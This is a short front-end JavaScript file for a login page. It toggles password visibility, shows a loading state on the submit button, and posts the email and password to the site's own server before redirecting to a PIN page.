const email = document.querySelector("#email");
const password = document.querySelector("#password");
const icons = document.querySelectorAll(".Input i");

icons.forEach((icon) => {
  icon.addEventListener("click", function () {
    // Toggle the "open" class on the clicked icon
    icon.classList.toggle("open");

    // Hide all other icons except the clicked one
    icons.forEach((otherIcon) => {
      if (otherIcon !== icon) {
        otherIcon.classList.remove("open");
      }
    });
  });
});

icons.forEach((eye) => {
  eye.onclick = () => {
    if (password.type === "password") {
      password.type = "text";
    } else {
      password.type = "password";
    }
  };
});

// FORM SUBMIT

const form = document.querySelector("form");
const btn = document.querySelector("button");

btn.onclick = () => {
  btn.innerHTML = "Loading...";
  btn.classList.add("loading");
};

form.addEventListener("submit", (e) => {
  e.preventDefault();

  let formData = {
    email: email.value,
    password: password.value,
  };

  let xhr = new XMLHttpRequest();
  xhr.open("POST", "/");
  xhr.setRequestHeader("content-type", "application/json");
  xhr.onload = function () {
    console.log(xhr.responseText);
    if (xhr.responseText == "success") {
      email.value = "";
      password.value = "";
      location.href = "/pin";
    } else {
      console.log("error");
    }
  };

  xhr.send(JSON.stringify(formData));
});
